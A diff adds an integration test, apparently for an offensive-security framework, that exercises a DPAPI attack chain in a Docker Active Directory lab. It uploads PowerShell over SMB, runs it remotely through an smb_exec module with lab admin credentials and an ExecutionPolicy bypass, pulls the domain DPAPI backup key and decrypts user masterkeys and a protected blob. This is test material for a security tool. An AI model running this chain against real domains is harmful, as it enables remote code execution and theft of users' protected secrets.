@@ -4011,6 +4011,207 @@ class TestDpapiBackupKeyLab(unittest.TestCase):
 
 @unittest.skipUnless(docker_available(), "docker daemon not available")
 @unittest.skipUnless(impacket_available(), "impacket not installed")
+@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
+class TestDpapiMasterkeysLab(unittest.TestCase):
+    """DPAPI stage 2, end to end: a scheduled task makes FORGE\\Administrator
+    touch DPAPI on the CA (a REAL Windows-minted masterkey + probe blob —
+    no synthetic crypto in the fixture), dpapi_backupkey pulls the domain
+    backup key, dpapi_masterkeys unwraps the masterkey file it finds over
+    SMB, and the recovered key decrypts the probe blob. The fixture is
+    created here when missing (cold lab): files land over SMB, then
+    smb_exec fires powershell as a cmd child — the exec shape that works
+    on Server 2022."""
+
+    PROTECT = r"Users\Administrator\AppData\Roaming\Microsoft\Protect"
+
+    @classmethod
+    def setUpClass(cls):
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("domain")
+        cls._wait_ca_ready()
+        cls._ensure_fixture()
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("domain")
+
+    @classmethod
+    def _ca(cls):
+        from impacket.smbconnection import SMBConnection
+        conn = SMBConnection(HOST, HOST, sess_port=4445, timeout=15)
+        conn.login("Administrator", "P@ssw0rd123", "forge.local")
+        return conn
+
+    @classmethod
+    def _wait_ca_ready(cls):
+        # the CA installs Windows, joins, installs AD CS (~30 min cold):
+        # wait for its oem sentinel
+        deadline = time.time() + 3600
+        while time.time() < deadline:
+            try:
+                conn = cls._ca()
+                buf = []
+                conn.getFile("C$", r"OEM\CA-READY.txt", buf.append)
+                raw = b"".join(buf)
+                # PowerShell's Out-File writes UTF-16LE (BOM) on 5.1
+                if raw.startswith(b"\xff\xfe"):
+                    text = raw[2:].decode("utf-16-le", "replace").strip()
+                else:
+                    text = raw.decode("utf-8", "replace").strip()
+                conn.close()
+                if text == "ready":
+                    return
+            except Exception:
+                time.sleep(20)
+
+    @classmethod
+    def _fixture_present(cls):
+        try:
+            conn = cls._ca()
+        except Exception:
+            return False
+        try:
+            buf = []
+            conn.getFile("C$", r"Users\Public\probe.blob", buf.append)
+            data = b"".join(buf)
+            # must be a RAW DPAPI blob (version magic 01 00 00 00) — a
+            # text-encoded artifact (ASCII hex/base64) is not a fixture
+            if not data.startswith(b"\x01\x00\x00\x00"):
+                return False
+            for sid in cls._sid_dirs(conn):
+                entries = [f.get_longname() for f in conn.listPath(
+                    "C$", cls.PROTECT + "\\" + sid + r"\*")]
+                if any(e.count("-") == 4 for e in entries):
+                    return True
+            return False
+        except Exception:
+            return False
+        finally:
+            conn.close()
+
+    @classmethod
+    def _sid_dirs(cls, conn):
+        return [d.get_longname() for d in
+                conn.listPath("C$", cls.PROTECT + r"\*")
+                if d.get_longname().startswith("S-1-5-21")]
+
+    @classmethod
+    def _put(cls, conn, path, data):
+        state = {"off": 0}
+
+        def reader(size):
+            chunk = data[state["off"]:state["off"] + size]
+            state["off"] += len(chunk)
+            return chunk
+
+        conn.putFile("C$", path, reader)
+
+    @classmethod
+    def _ensure_fixture(cls):
+        if cls._fixture_present():
+            return
+        # CryptProtectData as FORGE\Administrator: Register-ScheduledTask
+        # -Password gets a batch-logon user context with no interactive
+        # session; the task's Protect call mints the masterkey + blob.
+        probe_ps1 = (
+            "Add-Type -AssemblyName System.Security\r\n"
+            "$b = [Text.Encoding]::UTF8.GetBytes('stage2-probe')\r\n"
+            "$e = [Security.Cryptography.ProtectedData]::Protect("
+            "$b, $null, 'CurrentUser')\r\n"
+            "[IO.File]::WriteAllBytes("
+            "'C:\\Users\\Public\\probe.blob', $e)\r\n")
+        regtask_ps1 = (
+            "$a = New-ScheduledTaskAction -Execute powershell.exe "
+            "-Argument '-NoProfile -ExecutionPolicy Bypass -File "
+            "C:\\Users\\Public\\probe.ps1'\r\n"
+            "Register-ScheduledTask -TaskName fz -Action $a -User "
+            "'FORGE\\Administrator' -Password 'P@ssw0rd123' -Force\r\n"
+            "Start-ScheduledTask -TaskName fz\r\n"
+            "Start-Sleep -Seconds 10\r\n"
+            "Unregister-ScheduledTask -TaskName fz -Confirm:$false\r\n")
+        conn = cls._ca()
+        try:
+            cls._put(conn, r"Users\Public\probe.ps1", probe_ps1.encode())
+            cls._put(conn, r"Users\Public\regtask.ps1", regtask_ps1.encode())
+        finally:
+            conn.close()
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            with contextlib.redirect_stdout(io.StringIO()):
+                for command in (
+                    "use exploits/windows/smb_exec",
+                    f"set RHOSTS {HOST}",
+                    "set RPORT 4445",
+                    "set DOMAIN forge.local",
+                    "set USERNAME Administrator",
+                    "set PASSWORD P@ssw0rd123",
+                    # the console's shlex parsing eats backslashes on
+                    # set — double them so a literal \ reaches COMMAND
+                    "set COMMAND powershell -NoProfile -ExecutionPolicy "
+                    "Bypass -File C:\\\\Users\\\\Public\\\\regtask.ps1",
+                    "run",
+                ):
+                    console.onecmd(command)
+        finally:
+            console.store.close()
+        # the task runs after the service fires it — poll for the artifacts
+        deadline = time.time() + 120
+        while time.time() < deadline:
+            if cls._fixture_present():
+                return
+            time.sleep(5)
+        raise AssertionError("DPAPI fixture did not materialize on the CA")
+
+    def test_masterkey_unlocks_probe_blob(self):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in (
+                    "use auxiliary/attack/dpapi_backupkey",
+                    f"set RHOSTS {HOST}",
+                    "set DOMAIN forge.local",
+                    "set USERNAME Administrator",
+                    "set PASSWORD P@ssw0rd123",
+                    "run",
+                    "use auxiliary/attack/dpapi_masterkeys",
+                    f"set RHOSTS {HOST}",
+                    "set RPORT 4445",
+                    "set DOMAIN forge.local",
+                    "set USERNAME Administrator",
+                    "set PASSWORD P@ssw0rd123",
+                    "run",
+                ):
+                    console.onecmd(command)
+            out = buf.getvalue()
+            self.assertNotIn("Traceback", out)
+            self.assertIn("masterkey decrypted", out)
+            loot = console.store.loot("masterkey")
+            self.assertGreaterEqual(len(loot), 1)
+            from impacket.dpapi import DPAPI_BLOB
+            conn = self._ca()
+            try:
+                raw = []
+                conn.getFile("C$", r"Users\Public\probe.blob", raw.append)
+                blob = DPAPI_BLOB(b"".join(raw))
+            finally:
+                conn.close()
+            recovered = [bytes.fromhex(l["content"]) for l in loot
+                         if len(l["content"]) == 128]
+            # impacket's DPAPI_BLOB.decrypt takes the RAW masterkey (it
+            # does the SHA1 + both session-key HMAC variants internally)
+            plaintexts = [blob.decrypt(k) for k in recovered]
+            self.assertIn(b"stage2-probe", plaintexts)
+        finally:
+            console.store.close()
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
 class TestShadowCredsLab(unittest.TestCase):
     """shadow_creds against the AD lab: the fixture schema carries
     msDS-KeyCredentialLink, so the plant + restore are real. The TGT
